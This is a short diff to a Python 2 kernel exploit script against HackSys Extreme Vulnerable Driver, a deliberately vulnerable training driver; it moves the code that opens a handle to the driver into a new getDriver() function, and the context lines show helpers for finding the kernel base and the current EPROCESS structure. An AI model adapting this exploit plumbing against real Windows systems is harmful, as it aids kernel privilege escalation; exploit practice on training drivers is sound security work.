@@ -314,12 +314,9 @@ def get_current_eprocess(system_process_base_pointer):
 
     return currentprocessBase
 
-
-########################################### MAIN ###############################################
-
-def executeOverwrite():
-
-    # This is a fixed address in our userland memory page.
+####################################### GET DRIVER HANDLE ######################################
+def getDriver():
+        # This is a fixed address in our userland memory page.
 
     driver = kernel32.CreateFileA(
         '\\\\.\\HackSysExtremeVulnerableDriver',
@@ -336,6 +333,14 @@ def executeOverwrite():
     else:
         print '[X] Got handle to the driver.\n'
 
+        return driver
+        
+########################################### MAIN ###############################################
+
+def executeOverwrite():
+
+        driver = getDriver()
+        
         # Get kernel base.
 
         (img_name, kernel_base) = getkernelBase(driver)
